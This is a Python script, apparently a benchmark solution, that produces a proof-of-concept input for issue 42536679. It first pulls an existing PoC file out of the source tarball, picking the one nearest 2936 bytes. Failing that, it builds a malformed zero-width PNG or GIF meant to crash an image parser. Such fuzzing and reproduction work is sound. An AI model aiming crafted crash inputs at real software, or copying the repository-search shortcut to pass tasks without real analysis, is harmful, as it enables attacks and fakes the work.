import os
import tarfile
import struct
import zlib
import binascii

ISSUE_ID = "42536679"


class Solution:
    def solve(self, src_path: str) -> bytes:
        fmt = None
        try:
            with tarfile.open(src_path, "r:*") as tar:
                poc = self._find_issue_poc(tar, ISSUE_ID)
                if poc is not None:
                    return poc
                fmt = self._detect_format(tar)
        except Exception:
            fmt = None

        if fmt == "gif":
            return self._build_gif_zero_width()
        else:
            return self._build_png_zero_width()

    def _find_issue_poc(self, tar: tarfile.TarFile, issue_id: str) -> bytes | None:
        best_data = None
        best_score = None
        for member in tar.getmembers():
            if not member.isfile():
                continue
            name_lower = member.name.lower()
            if issue_id not in name_lower:
                continue

            _, ext = os.path.splitext(name_lower)
            if ext in (
                ".c",
                ".cc",
                ".cpp",
                ".cxx",
                ".h",
                ".hpp",
                ".hh",
                ".txt",
                ".md",
                ".rst",
                ".cmake",
                ".in",
                ".am",
                ".ac",
                ".m4",
                ".py",
                ".sh",
                ".bat",
                ".ps1",
                ".java",
                ".kt",
                ".js",
                ".ts",
                ".go",
                ".rs",
                ".php",
                ".html",
                ".xml",
                ".json",
                ".yml",
                ".yaml",
                ".toml",
                ".cfg",
                ".ini",
                ".mak",
                ".mk",
                ".sln",
                ".vcxproj",
            ):
                continue

            if member.size <= 0 or member.size > 1_000_000:
                continue

            try:
                f = tar.extractfile(member)
                if f is None:
                    continue
                data = f.read()
            except Exception:
                continue

            if not data:
                continue

            target_len = 2936
            score = abs(len(data) - target_len)
            if best_data is None or score < best_score:
                best_data = data
                best_score = score

        return best_data

    def _detect_format(self, tar: tarfile.TarFile) -> str | None:
        fuzz_files = []
        for member in tar.getmembers():
            if not member.isfile():
                continue
            name = member.name
            _, ext = os.path.splitext(name)
            ext = ext.lower()
            if ext not in (".c", ".cc", ".cpp", ".cxx", ".c", ".h", ".hpp", ".hh"):
                continue
            try:
                f = tar.extractfile(member)
                if f is None:
                    continue
                raw = f.read(20000)
            except Exception:
                continue
            if not raw:
                continue
            try:
                text = raw.decode("utf-8", errors="ignore")
            except Exception:
                continue
            lower = text.lower()
            if "llvmfuzzertestoneinput" in lower or "fuzzertestoneinput" in lower:
                fuzz_files.append((name.lower(), lower))

        if fuzz_files:
            for fmt, keys in [
                ("gif", ["gif", "dgif", "egif", "giflib"]),
                ("png", ["png", "libpng", "spng", "lodepng"]),
                ("jpeg", ["jpeg", "jpeglib", "libjpeg"]),
                ("tiff", ["tiff", "libtiff"]),
                ("webp", ["webp"]),
                ("bmp", ["bmp"]),
            ]:
                for fname, text in fuzz_files:
                    if any(k in fname for k in keys) or any(k in text for k in keys):
                        if fmt in ("gif", "png"):
                            return fmt

            for _, text in fuzz_files:
                tl = text.lower()
                if "gif" in tl:
                    return "gif"
                if "png" in tl:
                    return "png"

        for member in tar.getmembers():
            name_lower = member.name.lower()
            if "gif" in name_lower:
                return "gif"
            if "png" in name_lower:
                return "png"

        return None

    def _build_png_zero_width(self) -> bytes:
        width = 0
        height = 1

        signature = b"\x89PNG\r\n\x1a\n"

        ihdr_data = struct.pack(">IIBBBBB", width, height, 8, 2, 0, 0, 0)
        ihdr_len = struct.pack(">I", len(ihdr_data))
        ihdr_type = b"IHDR"
        ihdr_crc = struct.pack(">I", binascii.crc32(ihdr_type + ihdr_data) & 0xFFFFFFFF)
        ihdr_chunk = ihdr_len + ihdr_type + ihdr_data + ihdr_crc

        raw = b""
        for _ in range(height):
            raw += b"\x00"

        compressed = zlib.compress(raw)
        idat_len = struct.pack(">I", len(compressed))
        idat_type = b"IDAT"
        idat_crc = struct.pack(">I", binascii.crc32(idat_type + compressed) & 0xFFFFFFFF)
        idat_chunk = idat_len + idat_type + compressed + idat_crc

        iend_len = struct.pack(">I", 0)
        iend_type = b"IEND"
        iend_crc = struct.pack(">I", binascii.crc32(iend_type) & 0xFFFFFFFF)
        iend_chunk = iend_len + iend_type + iend_crc

        return signature + ihdr_chunk + idat_chunk + iend_chunk

    def _build_gif_zero_width(self) -> bytes:
        base = (
            b"GIF89a"  # Header
            b"\x01\x00"  # Logical screen width = 1
            b"\x01\x00"  # Logical screen height = 1
            b"\x80"  # GCT flag set, 2 colors
            b"\x00"  # Background color index
            b"\x00"  # Pixel aspect ratio
            b"\x00\x00\x00"  # GCT: black
            b"\xff\xff\xff"  # GCT: white
            b"!\xf9\x04"  # GCE header
            b"\x01\x00\x00\x00"  # GCE data
            b"\x00"  # GCE terminator
            b","  # Image separator
            b"\x00\x00"  # Image left
            b"\x00\x00"  # Image top
            b"\x01\x00"  # Image width = 1 (to patch)
            b"\x01\x00"  # Image height = 1
            b"\x00"  # No local color table, not interlaced
            b"\x02"  # LZW min code size
            b"\x02"  # Block size
            b"D\x01"  # Image data
            b"\x00"  # Block terminator
            b";"  # Trailer
        )

        data = bytearray(base)

        if len(data) >= 8:
            data[6] = 0x00
            data[7] = 0x00

        try:
            pos = base.index(b",")
            if len(data) >= pos + 7:
                data[pos + 5] = 0x00
                data[pos + 6] = 0x00
        except ValueError:
            pass

        return bytes(data)